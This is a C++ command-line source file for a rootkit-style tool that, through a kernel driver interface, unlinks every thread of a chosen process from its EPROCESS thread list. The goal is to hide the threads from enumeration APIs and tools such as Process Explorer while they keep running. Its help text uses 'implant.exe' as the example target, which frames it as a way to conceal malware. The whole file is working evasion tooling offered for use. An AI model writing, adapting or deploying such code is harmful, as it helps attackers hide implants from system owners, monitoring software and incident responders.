#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <memory>
#include <string>
#include "../Memory/DriverInterface/driver_interface.hpp"

static std::wstring to_wide( const char* s )
{
	std::wstring ws;
	while( *s ) ws += static_cast< wchar_t >( *s++ );
	return ws;
}

void print_help( const char* prog )
{
	printf( "%s - Hide all threads of a process from enumeration.\n", prog );
	printf( "\n" );
	printf( "Description:\n" );
	printf( "  Unlinks all threads from the process's ThreadListHead in the\n" );
	printf( "  EPROCESS structure. After calling this, thread enumeration APIs\n" );
	printf( "  (NtQuerySystemInformation, Process Explorer, etc.) will no longer\n" );
	printf( "  see the threads. The threads continue to execute normally.\n" );
	printf( "\n" );
	printf( "Usage:\n" );
	printf( "  %s <process_name>     Hide threads by process name\n", prog );
	printf( "  %s --pid <pid>        Hide threads by process ID\n", prog );
	printf( "  %s --help             Show this help\n", prog );
	printf( "\n" );
	printf( "Arguments:\n" );
	printf( "  process_name    Name of the target process (e.g. implant.exe)\n" );
	printf( "  --pid <pid>     Process ID (decimal)\n" );
	printf( "\n" );
	printf( "Examples:\n" );
	printf( "  %s implant.exe\n", prog );
	printf( "  %s --pid 4200\n", prog );
}

int main( int argc, char* argv[] )
{
	if( argc < 2 || strcmp( argv[1], "--help" ) == 0 || strcmp( argv[1], "-h" ) == 0 )
	{
		print_help( argv[0] );
		return argc > 1 && ( strcmp( argv[1], "--help" ) == 0 || strcmp( argv[1], "-h" ) == 0 ) ? 0 : 1;
	}

	const auto driver = std::make_unique< driver_interface >();

	if( !driver->is_connected() )
	{
		printf( "[!] Could not connect to the driver!\n" );
		return 1;
	}

	if( strcmp( argv[1], "--pid" ) == 0 )
	{
		if( argc < 3 )
		{
			printf( "[!] --pid requires a process ID argument.\n" );
			return 1;
		}

		driver->attach( static_cast< DWORD >( strtoul( argv[2], nullptr, 10 ) ) );
	}
	else
	{
		const auto name = to_wide( argv[1] );

		if( !driver->attach( name ) )
		{
			printf( "[!] Could not find process '%s'!\n", argv[1] );
			return 1;
		}
	}

	printf( "[+] Target PID: %u\n", driver->get_pid() );

	if( auto hidden = driver->hide_threads() )
		printf( "[+] Hidden %u threads from enumeration.\n", *hidden );
	else
	{
		printf( "[!] Failed to hide threads.\n" );
		return 1;
	}

	return 0;
}
